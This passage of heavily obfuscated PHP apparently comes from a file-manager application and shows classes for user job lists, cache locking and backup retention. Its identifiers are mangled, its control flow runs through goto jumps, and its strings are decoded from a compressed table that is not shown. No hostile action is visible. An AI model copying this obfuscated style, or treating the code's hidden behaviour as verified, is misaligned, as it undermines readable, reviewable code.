$_SERVER[úÎü]; $FÄÑ—‡ö·ó = array($C·òåôğôœ[1477] => USER_ID, $C·òåôğôœ[402] => $B§ğ¸Á±¶¯, $C·òåôğôœ[451] => 0); return $this->where($FÄÑ—‡ö·ó)->delete(); } protected function rename($EöµÌ¢ïŸ, $E»ƒ×ß¼ò¿) { $dó‡¿ˆ©óÛ =& $_SERVER[úÎü]; if ($EöµÌ¢ïŸ == $E»ƒ×ß¼ò¿) { return !1; } $f÷¡ºƒáÄÎ = $this->getAutoName($E»ƒ×ß¼ò¿); if ($E»ƒ×ß¼ò¿ != $f÷¡ºƒáÄÎ) { return !1; } $fñ§Ü£Ò¹ä = array($dó‡¿ˆ©óÛ[1477] => USER_ID, $dó‡¿ˆ©óÛ[451] => 0, $dó‡¿ˆ©óÛ[28] => $EöµÌ¢ïŸ); return $this->where($fñ§Ü£Ò¹ä)->save(array($dó‡¿ˆ©óÛ[28] => $E»ƒ×ß¼ò¿)); } protected function resetSort($eÚèŠˆ„Ö) { $Cˆ¯–¦…‹ =& $_SERVER[úÎü]; $eÚèŠˆ„Ö = is_array($eÚèŠˆ„Ö) ? $eÚèŠˆ„Ö : array(); $dêÜ¤âŞÃ = array($Cˆ¯–¦…‹[1477] => USER_ID); for ($bÄˆØÁ¼õ = 0; $bÄˆØÁ¼õ < count($eÚèŠˆ„Ö); $bÄˆØÁ¼õ++) { $dêÜ¤âŞÃ[$Cˆ¯–¦…‹[401]] = $eÚèŠˆ„Ö[$bÄˆØÁ¼õ]; $this->where($dêÜ¤âŞÃ)->save(array($Cˆ¯–¦…‹[1648] => $bÄˆØÁ¼õ + 1)); } return !0; } protected function moveTop($dƒÃØ›¢ºˆ) { goto c» Í©; d¼î•Ö¢: return $this->resetSort($Fß½øÊ¼à); goto BÕÄ“‡›‘Ş; c» Í©: $eµ—±Œä» =& $_SERVER[úÎü]; $Dç®–ŠÓÉ¹ = array($eµ—±Œä»[1477] => USER_ID, $eµ—±Œä»[451] => 0); $C…Îøƒ÷ä¶ = $this->where($Dç®–ŠÓÉ¹)->where(array($eµ—±Œä»[28] => $dƒÃØ›¢ºˆ))->find(); goto cÉí¹Ø¾ˆ¦; aÆ²†·äÄ—: $A¹ˆË’µ¹ = $Fß½øÊ¼à; $Fß½øÊ¼à = array_remove_value($Fß½øÊ¼à, $C…Îøƒ÷ä¶[$eµ—±Œä»[383]]); array_unshift($Fß½øÊ¼à, $C…Îøƒ÷ä¶[$eµ—±Œä»[383]]); goto d¼î•Ö¢; cÉí¹Ø¾ˆ¦: if (!$C…Îøƒ÷ä¶) { return; } $Fß½øÊ¼à = $this->field($eµ—±Œä»[383])->where($Dç®–ŠÓÉ¹)->order($eµ—±Œä»[2060])->select(); $Fß½øÊ¼à = array_to_keyvalue($Fß½øÊ¼à, $eµ—±Œä»[33], $eµ—±Œä»[383]); goto aÆ²†·äÄ—; BÕÄ“‡›‘Ş: } protected function moveBottom($dî²âˆ©) { $Eˆ‡Ò‡˜ =& $_SERVER[úÎü]; $e¥ÇÃøÂª = array($Eˆ‡Ò‡˜[1477] => USER_ID, $Eˆ‡Ò‡˜[451] => 0); $BÁÏÒ™¸ = $this->where($e¥ÇÃøÂª)->max($Eˆ‡Ò‡˜[1667]); $cÎŠ¢Ä­–É = array($Eˆ‡Ò‡˜[1667] => $BÁÏÒ™¸ + 1); return $this->where($e¥ÇÃøÂª)->where(array($Eˆ‡Ò‡˜[28] => $dî²âˆ©))->save($cÎŠ¢Ä­–É); } private function getAutoName($b­£½±²¬•) { goto D…¬Ğã—ÂÈ; D…¬Ğã—ÂÈ: $a·¢ÆÅ¢àØ =& $_SERVER[úÎü]; $a®²ŸÜÆ = array($a·¢ÆÅ¢àØ[1477] => USER_ID, $a·¢ÆÅ¢àØ[451] => 0); $bÊÀìÈƒ®… = $this->field($a·¢ÆÅ¢àØ[28])->where($a®²ŸÜÆ)->select(); goto A½Ë¯„¦; A½Ë¯„¦: $bÊÀìÈƒ®… = array_to_keyvalue($bÊÀìÈƒ®…, $a·¢ÆÅ¢àØ[33], $a·¢ÆÅ¢àØ[28]); if (!$bÊÀìÈƒ®… || !in_array($b­£½±²¬•, $bÊÀìÈƒ®…)) { return $b­£½±²¬•; } for ($CøéÄ÷Áƒ· = 0; $CøéÄ÷Áƒ· < count($bÊÀìÈƒ®…); $CøéÄ÷Áƒ·++) { if (!in_array($b­£½±²¬• . "\50{$CøéÄ÷Áƒ·}\51", $bÊÀìÈƒ®…)) { return $b­£½±²¬• . "\x28{$CøéÄ÷Áƒ·}\x29"; } } goto e½¼Ç›èö; e½¼Ç›èö: return $b­£½±²¬• . "\50{$CøéÄ÷Áƒ·}\51"; goto fŞ„®§¿; fŞ„®§¿: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\x6a\157\142\x4c\x69\163\x74"; public $field = array("\156\141\x6d\145", "\x64\145\163\143", "\163\157\x72\164"); const JOB_KEY = "\x73\145\154\146\112\157\x62\x4c\151\x73\164"; public function listData($f–‚ƒß‰¶ = false, $bÎ«îÖ‡‹Ù = "\163\157\162\164", $Cé†ÄÁÓ«‚ = false) { return parent::listData($f–‚ƒß‰¶, $bÎ«îÖ‡‹Ù, $Cé†ÄÁÓ«‚); } public function remove($F•åÈŠ—¤) { return parent::remove($F•åÈŠ—¤); } public function add($d¾Œ¹­®Öè) { $fÂ°¬‚Ç‹­ =& $_SERVER[úÎü]; if ($this->findByName($d¾Œ¹­®Öè[$fÂ°¬‚Ç‹­[28]])) { return !1; } $d¾Œ¹­®Öè[$fÂ°¬‚Ç‹­[1667]] = $this->getSort(); return parent::insert($d¾Œ¹­®Öè); } private function getSort() { $aÔ´•÷æğ =& $_SERVER[úÎü]; $dÇÄçîÅ½è = parent::listData(); $fæšÒ¡¯œ¶ = array_to_keyvalue($dÇÄçîÅ½è, $aÔ´•÷æğ[33], $aÔ´•÷æğ[1667]); return empty($fæšÒ¡¯œ¶) ? 0 : max($fæšÒ¡¯œ¶) + 1; } public function update($A¦ù·ÍÓ, $Dõæèù¿ÍŸ) { $d…´ªâ± =& $_SERVER[úÎü]; $AŠõŠóÊÊã = parent::listData($A¦ù·ÍÓ); $b¿±¡Ò°Ä = $this->findByName($Dõæèù¿ÍŸ[$d…´ªâ±[28]]); if (!$AŠõŠóÊÊã || $b¿±¡Ò°Ä && $b¿±¡Ò°Ä[$d…´ªâ±[383]] != $AŠõŠóÊÊã[$d…´ªâ±[383]]) { return !1; } return parent::update($A¦ù·ÍÓ, $Dõæèù¿ÍŸ); } public function setUserJob($AŞ‹ÉôÈÓ, $AÔ‘Í”õæÚ) { goto f…·®³ˆÖ; f¬ö¥ƒ©öÙ: $cÍé…³Ñœ = rtrim($cÍé…³Ñœ, $dÏéÑÑ•¹Ê[47]); Model($dÏéÑÑ•¹Ê[494])->metaSet($AŞ‹ÉôÈÓ, self::JOB_KEY, $cÍé…³Ñœ); goto bô¯š­Å®; D¥˜âË×­: $eËìˆ×½é = array_to_keyvalue($eğÉ™Œ¥±”, $dÏéÑÑ•¹Ê[28]); $cÍé…³Ñœ = $dÏéÑÑ•¹Ê[368]; foreach ($AÔ‘Í”õæÚ as $CåÊ§ˆæÜ¾) { if ($eËìˆ×½é[$CåÊ§ˆæÜ¾]) { $cÍé…³Ñœ .= $eËìˆ×½é[$CåÊ§ˆæÜ¾][$dÏéÑÑ•¹Ê[383]] . $dÏéÑÑ•¹Ê[47]; } else { $cÚòÄáù«¸ = $this->add($CåÊ§ˆæÜ¾); $cÍé…³Ñœ .= $cÚòÄáù«¸ . $dÏéÑÑ•¹Ê[47]; } } goto f¬ö¥ƒ©öÙ; f…·®³ˆÖ: $dÏéÑÑ•¹Ê =& $_SERVER[úÎü]; if (!is_array($AÔ‘Í”õæÚ)) { $AÔ‘Í”õæÚ = array($AÔ‘Í”õæÚ); } $eğÉ™Œ¥±” = parent::listData(); goto D¥˜âË×­; bô¯š­Å®: } public function getUserJob($fÃ²œãÛ¿·) { $AÛò‡¡½™ø = Model($_SERVER[úÎü][494])->metaGet($fÃ²œãÛ¿·); return $this->getUserJobInfo($AÛò‡¡½™ø[self::JOB_KEY]); } public function getUserJobInfo($A»‚°„ËæÛ) { goto fĞìŒŞ‰; cÉôîÃ½ Ç: $dÚÉÛêâæ = array_remove_key($dÚÉÛêâæ, $f‰ŸŒí¯Æ[190]); $dåÀÚé¢· = array(); foreach ($Aªİ‰³Ëñ as $eôÙ“ïÔÉ…) { if (isset($dÚÉÛêâæ[$eôÙ“ïÔÉ…])) { $dåÀÚé¢·[] = $dÚÉÛêâæ[$eôÙ“ïÔÉ…]; } } goto A¾›Îä÷Š; A¾›Îä÷Š: return $dåÀÚé¢·; goto cæ–…“Øô‰; fĞìŒŞ‰: $f‰ŸŒí¯Æ =& $_SERVER[úÎü]; $Aªİ‰³Ëñ = explode($f‰ŸŒí¯Æ[47], $A»‚°„ËæÛ); $dÚÉÛêâæ = parent::listData(); goto cÉôîÃ½ Ç; cæ–…“Øô‰: } } goto C¢¬¿©¨Œ; E¬™©¯æõº: class CacheLockRedis { public function lock($FÊğšç÷ğ…, $a°À½¨œºø = 10) { $C‹Ø×©…Á = Cache::init(); $D¥Á©Æğ× = microtime(!0) + $a°À½¨œºø; while (microtime(!0) < $D¥Á©Æğ×) { $A‘‰÷®®˜ = $C‹Ø×©…Á->get($FÊğšç÷ğ…); if (!$A‘‰÷®®˜) { $c®ßˆº‘Õ… = $C‹Ø×©…Á->setLock($FÊğšç÷ğ…, $D¥Á©Æğ×, $a°À½¨œºø); if ($c®ßˆº‘Õ…) { return !0; } } else { if ($A‘‰÷®®˜ < microtime(!0)) { $C‹Ø×©…Á->set($FÊğšç÷ğ…, $D¥Á©Æğ×, $D¥Á©Æğ×); if ($C‹Ø×©…Á->get($FÊğšç÷ğ…) === $A‘‰÷®®˜) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($D˜Ÿå‹‘Ï) { return Cache::init()->get($D˜Ÿå‹‘Ï); } public function unlock($d˜Òâ›ªöÜ) { return Cache::init()->remove($d˜Òâ›ªöÜ); } } class CacheLockMemcached { public function lock($eéÇÃÇâğ£, $fÊ¯’¸‹Õ„ = 0) { $D¬³Ø…Ÿª× = Cache::init(); $FÛØêô´„è = microtime(!0) + $fÊ¯’¸‹Õ„; while (microtime(!0) < $FÛØêô´„è) { $bê‘Ö³Ù = $D¬³Ø…Ÿª×->get($eéÇÃÇâğ£); if (!$bê‘Ö³Ù || $bê‘Ö³Ù < microtime(!0)) { $A—¯µÌ¸– = $D¬³Ø…Ÿª×->handle->add($eéÇÃÇâğ£, $FÛØêô´„è, $fÊ¯’¸‹Õ„); if ($A—¯µÌ¸–) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Bœëä¿ĞÂ„) { return Cache::init()->get($Bœëä¿ĞÂ„); } public function unlock($c¶ïŒƒ¨À˜) { return Cache::init()->remove($c¶ïŒƒ¨À˜); } } class CacheLockDatabase { public function lock($d‡›Ú¨ÊÒ¿, $BøøáÔ°ù = 0) { $CÉ¥ÙÄåéØ = Model($_SERVER[úÎü][756]); $A­‘´›àà = microtime(!0) + $BøøáÔ°ù; while (microtime(!0) < $A­‘´›àà) { $eÙ¿»‘Ú«ˆ = $CÉ¥ÙÄåéØ->get($d‡›Ú¨ÊÒ¿); if (!$eÙ¿»‘Ú«ˆ || $eÙ¿»‘Ú«ˆ < microtime(!0)) { $EÍÓö±Î‡Ó = $CÉ¥ÙÄåéØ->set($d‡›Ú¨ÊÒ¿, $A­‘´›àà); if ($EÍÓö±Î‡Ó) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($a¸é»¤ñê) { return Model($_SERVER[úÎü][756])->get($a¸é»¤ñê); } public function unlock($f“ˆ„Óæ«ì) { Model($_SERVER[úÎü][756])->remove($f“ˆ„Óæ«ì); } } goto EÔˆÉƒÀ; B³Ë”‘ó›•: define($_SERVER[úÎü][0], $_SERVER[úÎü][1]); $_SERVER[’¹¡­‘Ç] = explode($_SERVER[úÎü][2], gzinflate(substr($_SERVER[úÎü][3], 10, -8))); function binCheckEq($CöÏÙ·Íš, $eŠ‡¯›æÀ) { return $CöÏÙ·Íš == $eŠ‡¯›æÀ; } goto Aßå¡„ÚÚ¢; Eœæ›ò˜„Ñ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto DÄÉ¬§Å‹‘; döİ²âŸÜ: self::$timeout = $e¦œßïÚé[$A±Ù†íÁß[767]] ? $e¦œßïÚé[$A±Ù†íÁß[767]] : 10; $F­¯àæŸÈ = _get($GLOBALS[$A±Ù†íÁß[6]], $A±Ù†íÁß[768]); $AŒ–•Ó¥…ù = $e¦œßïÚé[$A±Ù†íÁß[754]] ? $e¦œßïÚé[$A±Ù†íÁß[754]] : $A±Ù†íÁß[171]; goto Eí” ‹¶å…; Eí” ‹¶å…: if ($AŒ–•Ó¥…ù == $A±Ù†íÁß[17] && $F­¯àæŸÈ == $A±Ù†íÁß[9]) { $AŒ–•Ó¥…ù = $A±Ù†íÁß[171]; } switch ($AŒ–•Ó¥…ù) { case $A±Ù†íÁß[757]: self::$handle = new CacheLockRedis(); break; case $A±Ù†íÁß[758]: self::$handle = new CacheLockMemcached(); break; case $A±Ù†íÁß[17]: self::$handle = new CacheLockDatabase(); break; case $A±Ù†íÁß[171]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto AÛªôÁ»ñ; DÄÉ¬§Å‹‘: $A±Ù†íÁß =& $_SERVER[úÎü]; if (self::$handle) { return self::$handle; } $e¦œßïÚé = $GLOBALS[$A±Ù†íÁß[6]][$A±Ù†íÁß[343]]; goto döİ²âŸÜ; AÛªôÁ»ñ: } private static function key($e‚Ùƒ…Ù™‹) { return $_SERVER[úÎü][769] . Cache::key($e‚Ùƒ…Ù™‹); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($dÙÎâ›ô÷ = '') { self::$errorMsg = $dÙÎâ›ô÷; } public static function lockGlobal($c‡½ˆ²ãÌ°, $eÇ­¢¬“§ç) { return self::lock($c‡½ˆ²ãÌ°, $eÇ­¢¬“§ç, !0); } public static function lock($Fíƒ£™å„, $EŠ†ˆá“» = false, $C ¬ƒäøÈ = false) { goto Cö”¢®‡Á¶; EÖé¼Øñ“: if (!$C ¬ƒäøÈ) { self::$lockItem[$B‡œÔ‚¥Ä¦] = !0; } return $a²²÷Ö…ƒ; goto FœÉ¦£Œ»°; Cö”¢®‡Á¶: $C‰¬ÄÇÄ—³ =& $_SERVER[úÎü]; $A†Ä‡à£í‡ = self::init(); $B‡œÔ‚¥Ä¦ = self::key($Fíƒ£™å„); goto BëÛ°ÚÑ™Ú; BëÛ°ÚÑ™Ú: $EŠ†ˆá“» = $EŠ†ˆá“» ? $EŠ†ˆá“» : self::$timeout; $a²²÷Ö…ƒ = $A†Ä‡à£í‡->lock($B‡œÔ‚¥Ä¦, $EŠ†ˆá“»); if (!$a²²÷Ö…ƒ) { $A´Ë«¥ìäÎ = "\x6c\x6f\143\153\40\x65\x72\x72\157\x72\73\153\x65\171\75{$B‡œÔ‚¥Ä¦}\x3b\164\x69\x6d\145\x3d{$EŠ†ˆá“»}\x3b" . self::$errorMsg . $C‰¬ÄÇÄ—³[67] . get_caller_msg(); $Dá¸ñ¦äßå = LNG($C‰¬ÄÇÄ—³[770]) . "\50{$EŠ†ˆá“»}\x73\x2c{$B‡œÔ‚¥Ä¦}\51\41\12" . LNG($C‰¬ÄÇÄ—³[771]); $Dá¸ñ¦äßå .= $C‰¬ÄÇÄ—³[772]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Dá¸ñ¦äßå = $Dá¸ñ¦äßå . $C‰¬ÄÇÄ—³[773] . self::$errorMsg; } write_log($A´Ë«¥ìäÎ, $C‰¬ÄÇÄ—³[774]); show_json($Dá¸ñ¦äßå, !1); } goto EÖé¼Øñ“; FœÉ¦£Œ»°: } public static function lockGet($f¬âîã‹Ë) { $c“í‚ŠÌ•• = self::key($f¬âîã‹Ë); if (self::$lockItem[$c“í‚ŠÌ••]) { return self::$lockItem[$c“í‚ŠÌ••]; } return self::init()->lockGet($c“í‚ŠÌ••); } public static function unlock($B¿´‹ÓßÉ¾) { $e…Ğ¥¯ÕĞ = self::key($B¿´‹ÓßÉ¾); self::$lockItem[$e…Ğ¥¯ÕĞ] = null; return self::init()->unlock($e…Ğ¥¯ÕĞ); } public static function unlockRuntime() { $Aº¿µ•Œ’ =& $_SERVER[úÎü]; $D’Á¦Ù›µ = self::init(); $E°ŠŞ¢­¾¸ = !1; foreach (self::$lockItem as $eò‹âÉÈÌ» => $f…¨›¨«ª¤) { if (!$f…¨›¨«ª¤) { continue; } $D’Á¦Ù›µ->unlock($eò‹âÉÈÌ»); if (!$E°ŠŞ¢­¾¸) { $E°ŠŞ¢­¾¸ = !0; write_log($Aº¿µ•Œ’[775] . $eò‹âÉÈÌ» . $Aº¿µ•Œ’[67] . get_caller_msg(), $Aº¿µ•Œ’[774]); continue; } write_log($Aº¿µ•Œ’[775] . $eò‹âÉÈÌ», $Aº¿µ•Œ’[774]); } self::fileUnlockAll(); } public static function fileLock($eºáÙº°ÛÄ) { goto D”Ó°šÖÌ; dš¼çœï•¥: if (flock($f×—åøÅ˜Ó, LOCK_EX)) { return !0; } self::unlock($eºáÙº°ÛÄ); show_json($cŒ†˜ëÖâ¬[779], !1); goto DÅ¯ƒ¹”ˆ¶; eõ¦»»‡‘ß: $f×—åøÅ˜Ó = fopen(DATA_PATH . $eºáÙº°ÛÄ . $cŒ†˜ëÖâ¬[777], $cŒ†˜ëÖâ¬[778]); if (!$f×—åøÅ˜Ó) { return !1; } $GLOBALS[$cŒ†˜ëÖâ¬[776]][$eºáÙº°ÛÄ] = $f×—åøÅ˜Ó; goto dš¼çœï•¥; DÅ¯ƒ¹”ˆ¶: return !1; goto D¿ôùªÍò; D”Ó°šÖÌ: $cŒ†˜ëÖâ¬ =& $_SERVER[úÎü]; if (!$GLOBALS[$cŒ†˜ëÖâ¬[776]]) { $GLOBALS[$cŒ†˜ëÖâ¬[776]] = array(); } $GLOBALS[$cŒ†˜ëÖâ¬[776]][$eºáÙº°ÛÄ] = !1; goto eõ¦»»‡‘ß; D¿ôùªÍò: } public static function fileUnlock($dŞ«ÕøöÔ») { $eº…¦±“Â¾ =& $_SERVER[úÎü]; $D”œÁÉåÅ’ = $GLOBALS[$eº…¦±“Â¾[776]][$dŞ«ÕøöÔ»]; if (!$D”œÁÉåÅ’) { return; } $GLOBALS[$eº…¦±“Â¾[776]][$dŞ«ÕøöÔ»] = !1; flock($D”œÁÉåÅ’, LOCK_UN); fclose($D”œÁÉåÅ’); } public static function fileUnlockAll() { $A¬§Ó¡Ô”õ =& $_SERVER[úÎü]; if (!$GLOBALS[$A¬§Ó¡Ô”õ[776]]) { return; } foreach ($GLOBALS[$A¬§Ó¡Ô”õ[776]] as $E«é‹Ê‰ƒĞ => $fòÍ¤Ê—¹) { if (!$fòÍ¤Ê—¹) { continue; } $GLOBALS[$A¬§Ó¡Ô”õ[776]][$E«é‹Ê‰ƒĞ] = !1; flock($fòÍ¤Ê—¹, LOCK_UN); fclose($fòÍ¤Ê—¹); } $GLOBALS[$A¬§Ó¡Ô”õ[776]] = array(); } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $b‰°Ñˆ×ŠÒ =& $_SERVER[úÎü]; $Cœ¸••¤¬Ë = $GLOBALS[$b‰°Ñˆ×ŠÒ[6]][$b‰°Ñˆ×ŠÒ[343]]; self::$cachePath = $Cœ¸••¤¬Ë[$b‰°Ñˆ×ŠÒ[171]][$b‰°Ñˆ×ŠÒ[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bŒšËŠõ™›, $a£ŒºÃØë² = 0) { goto Açœò¥›‰›; A©µõ¨„‡Ü: $this->unlock($bŒšËŠõ™›); return !1; goto F„¾òÁ¹ê; c‰×šÁ²ÇÙ: $bî ³Ò´£ = rtrim(self::$cachePath, $BÍÉ‹ç­Äí[8]) . $BÍÉ‹ç­Äí[780] . md5($bŒšËŠõ™›) . $BÍÉ‹ç­Äí[777]; if (file_exists($bî ³Ò´£) && filemtime($bî ³Ò´£) && filemtime($bî ³Ò´£) < time() - 10) { @unlink($bî ³Ò´£); } do { if (file_exists($bî ³Ò´£)) { cacheLockWait(); continue; } $C“ÅßƒŞ»Ô = fopen($bî ³Ò´£, $BÍÉ‹ç­Äí[781]); if (!$C“ÅßƒŞ»Ô) { return !1; } $D½”„äí¡ = flock($C“ÅßƒŞ»Ô, LOCK_EX | LOCK_NB); self::$caches[$bŒšËŠõ™›] = array($BÍÉ‹ç­Äí[782] => $C“ÅßƒŞ»Ô, $BÍÉ‹ç­Äí[171] => $bî ³Ò´£); fwrite($C“ÅßƒŞ»Ô, $f¤†ªÆ§Æ²); clearstatcache(); if ($C“ÅßƒŞ»Ô && $D½”„äí¡) { return !0; } cacheLockWait(); } while (microtime(!0) < $f¤†ªÆ§Æ²); goto A©µõ¨„‡Ü; Açœò¥›‰›: $BÍÉ‹ç­Äí =& $_SERVER[úÎü]; $cŠò¨ùÆİ = microtime(!0); $f¤†ªÆ§Æ² = $cŠò¨ùÆİ + $a£ŒºÃØë² + 0.0001; goto c‰×šÁ²ÇÙ; F„¾òÁ¹ê: } public function lockGet($B…Ó­Ÿëò) { $FÆëŸ¦Š… =& $_SERVER[úÎü]; $c¹ˆ°² ´… = rtrim(self::$cachePath, $FÆëŸ¦Š…[8]) . $FÆëŸ¦Š…[780] . md5($B…Ó­Ÿëò) . $FÆëŸ¦Š…[777]; return file_exists($c¹ˆ°² ´…); } public function unlock($b×êçî§†¦) { goto E‡ô¼ šÀ«; bù˜©‚•±£: @flock($AÑ¸ì¤Öæí[$AÇ»¸Òƒ›[782]], LOCK_UN); @fclose($AÑ¸ì¤Öæí[$AÇ»¸Òƒ›[782]]); @unlink($AÑ¸ì¤Öæí[$AÇ»¸Òƒ›[171]]); goto EÉ°ŠğÁĞ„; EÉ°ŠğÁĞ„: unset(self::$caches[$b×êçî§†¦]); goto eŠ‹º´µìñ; E‡ô¼ šÀ«: $AÇ»¸Òƒ› =& $_SERVER[úÎü]; $AÑ¸ì¤Öæí = self::$caches[$b×êçî§†¦]; if (!$AÑ¸ì¤Öæí) { return; } goto bù˜©‚•±£; eŠ‹º´µìñ: } } goto E¬™©¯æõº; DŠ‘é¬¶§ß: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $câ¿¾êÓ„À =& $_SERVER[úÎü]; self::$name = date($câ¿¾êÓ„À[688]); if (!($c‘È¥çŞÃé = Model($câ¿¾êÓ„À[689])->lastItem())) { $c‘È¥çŞÃé = $this->initData(); } else { self::$name = $c‘È¥çŞÃé[$câ¿¾êÓ„À[28]]; if ($c‘È¥çŞÃé[$câ¿¾êÓ„À[690]] == $câ¿¾êÓ„À[83]) { self::$name = date($câ¿¾êÓ„À[691]); $aÂªÏØÂ‹ = 0; if (isset($c‘È¥çŞÃé[$câ¿¾êÓ„À[287]][$câ¿¾êÓ„À[171]][$câ¿¾êÓ„À[435]])) { $aÂªÏØÂ‹ = (int) $c‘È¥çŞÃé[$câ¿¾êÓ„À[287]][$câ¿¾êÓ„À[171]][$câ¿¾êÓ„À[435]]; } if ($c‘È¥çŞÃé[$câ¿¾êÓ„À[28]] == self::$name) { Model($câ¿¾êÓ„À[689])->remove($c‘È¥çŞÃé[$câ¿¾êÓ„À[383]]); } $c‘È¥çŞÃé = $this->initData($aÂªÏØÂ‹, $c‘È¥çŞÃé[$câ¿¾êÓ„À[692]]); } else { $this->checkStore($c‘È¥çŞÃé[$câ¿¾êÓ„À[692]]); } } self::$option = $c‘È¥çŞÃé; } private function initData($EÌãÌôÛÎ = 0, $eÒˆËÈ…ñç = '') { goto BÆ™ÚÀ½÷Ì; C·çƒŠ†Âİ: $c«âì‹„•[$FÔ´£âˆÓ½[383]] = $DÜÁ„—²Û÷; return $c«âì‹„•; goto cì•×åÚã—; F¥·‹¸‹‘: $this->checkStore($f–é‚ ¨œŞ[$FÔ´£âˆÓ½[692]]); $c«âì‹„• = array($FÔ´£âˆÓ½[692] => $f–é‚ ¨œŞ[$FÔ´£âˆÓ½[692]], $FÔ´£âˆÓ½[28] => self::$name, $FÔ´£âˆÓ½[690] => 0, $FÔ´£âˆÓ½[693] => $f–é‚ ¨œŞ[$FÔ´£âˆÓ½[693]], $FÔ´£âˆÓ½[287] => array($FÔ´£âˆÓ½[694] => array($FÔ´£âˆÓ½[690] => 0), $FÔ´£âˆÓ½[695] => array($FÔ´£âˆÓ½[690] => 0, $FÔ´£âˆÓ½[696] => 0, $FÔ´£âˆÓ½[697] => 0, $FÔ´£âˆÓ½[29] => $FÔ´£âˆÓ½[33]), $FÔ´£âˆÓ½[698] => array($FÔ´£âˆÓ½[690] => 0, $FÔ´£âˆÓ½[696] => 0, $FÔ´£âˆÓ½[697] => 0), $FÔ´£âˆÓ½[171] => array($FÔ´£âˆÓ½[690] => 0, $FÔ´£âˆÓ½[699] => 0, $FÔ´£âˆÓ½[700] => 0, $FÔ´£âˆÓ½[701] => 0, $FÔ´£âˆÓ½[702] => 0, $FÔ´£âˆÓ½[435] => $EÌãÌôÛÎ)), $FÔ´£âˆÓ½[703] => time(), $FÔ´£âˆÓ½[464] => 0); $DÜÁ„—²Û÷ = Model($FÔ´£âˆÓ½[689])->insert($c«âì‹„•); goto C·çƒŠ†Âİ; BÆ™ÚÀ½÷Ì: $FÔ´£âˆÓ½ =& $_SERVER[úÎü]; $f–é‚ ¨œŞ = Model($FÔ´£âˆÓ½[689])->config(); if ($eÒˆËÈ…ñç && $f–é‚ ¨œŞ[$FÔ´£âˆÓ½[692]] != $eÒˆËÈ…ñç) { $EÌãÌôÛÎ = 0; } goto F¥·‹¸‹‘; cì•×åÚã—: } private function checkStore($A¸£©—ô) { $fëç¨¾Ùæ =& $_SERVER[úÎü]; $cÖ ÷…Ñ¸’ = Model($fëç¨¾Ùæ[704])->listData($A¸£©—ô); Model($fëç¨¾Ùæ[704])->checkConfig($cÖ ÷…Ñ¸’); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[úÎü][689])->findByName(self::$name); } return self::$option; } public static function set($e¯Íñ¾Šİ) { $FÕ‰Äç©÷¯ =& $_SERVER[úÎü]; $b­Œôó¢‰Ï = self::get(); foreach ($e¯Íñ¾Šİ as $C»¯¼Î­·Õ => $A×õ÷‡…™) { $fÂ«Ú¿èÏÍ = explode($FÕ‰Äç©÷¯[91], $C»¯¼Î­·Õ); $cĞ¶˜åÈÌ± = count($fÂ«Ú¿èÏÍ); switch ($cĞ¶˜åÈÌ±) { case 1: $b­Œôó¢‰Ï[$fÂ«Ú¿èÏÍ[0]] = $A×õ÷‡…™; break; case 2: $b­Œôó¢‰Ï[$fÂ«Ú¿èÏÍ[0]][$fÂ«Ú¿èÏÍ[1]] = $A×õ÷‡…™; break; case 3: $b­Œôó¢‰Ï[$fÂ«Ú¿èÏÍ[0]][$fÂ«Ú¿èÏÍ[1]][$fÂ«Ú¿èÏÍ[2]] = $A×õ÷‡…™; break; } } Model($FÕ‰Äç©÷¯[689])->update($b­Œôó¢‰Ï[$FÕ‰Äç©÷¯[383]], $b­Œôó¢‰Ï); self::$option = $b­Œôó¢‰Ï; return self::$option; } public function keep() { $BÖëÕå³öË =& $_SERVER[úÎü]; $dªèñ÷ÔÛ« = self::get(); if ($dªèñ÷ÔÛ«[$BÖëÕå³öË[287]][$BÖëÕå³öË[694]][$BÖëÕå³öË[690]] == $BÖëÕå³öË[83]) { return; } $this->backupKeep($dªèñ÷ÔÛ«); self::set(array($BÖëÕå³öË[705] => 1)); } private function backupKeep($eëÅÒ”„¦Š) { goto f·åêÜƒ½; d²¸ˆš…À: $a¬‘–ƒÒ‡» = 0; $A‰È•§‰åÆ = array(); foreach ($bíŒÎ‚ÂŒ as $a…»Ü¯½õ) { if ($a¬‘–ƒÒ‡» >= 7) { break; } $A‰È•§‰åÆ[] = $a…»Ü¯½õ[$E¼¡†Ê¦Ÿ®[28]]; $a¬‘–ƒÒ‡»++; } goto e¶„Œ¯šä¾; e¶„Œ¯šä¾: for ($a¬‘–ƒÒ‡» = 0; $a¬‘–ƒÒ‡» < 12; $a¬‘–ƒÒ‡»++) { $A‰È•§‰åÆ[] = date($E¼¡†Ê¦Ÿ®[706], strtotime("\55{$a¬‘–ƒÒ‡»}\40\155\x6f\x6e\x74\x68\x73")); } $A‰È•§‰åÆ = array_unique($A‰È•§‰åÆ); foreach ($bíŒÎ‚ÂŒ as $a…»Ü¯½õ) { if (!empty($a…»Ü¯½õ[$E¼¡†Ê¦Ÿ®[28]]) && in_array($a…»Ü¯½õ[$E¼¡†Ê¦Ÿ®[28]], $A‰È•§‰åÆ)) { continue; } Model($E¼¡†Ê¦Ÿ®[689])->remove($a…»Ü¯½õ[$E¼¡†Ê¦Ÿ®[383]]); $a¿ŸÜé¡öÓ = "\x7b\x69\157\72{$eëÅÒ”„¦Š[$E¼¡†Ê¦Ÿ®[692]]}\175\x2f\144\141\x74\x61\142\x61\x73\x65\57\x62\141\x63\153\165\x70\x5f{$a…»Ü¯½õ[$E¼¡†Ê¦Ÿ®[28]]}"; IO::remove($a¿ŸÜé¡öÓ, !1); } goto B”±¢‰Üè; f·åêÜƒ½: $E¼¡†Ê¦Ÿ® =& $_SERVER[úÎü]; $bíŒÎ‚ÂŒ = Model($E¼¡†Ê¦Ÿ®[689])->listData(); if (empty($bíŒÎ‚ÂŒ)) { return; } goto d²¸ˆš…À; B”±¢‰Üè: } public function db() { goto 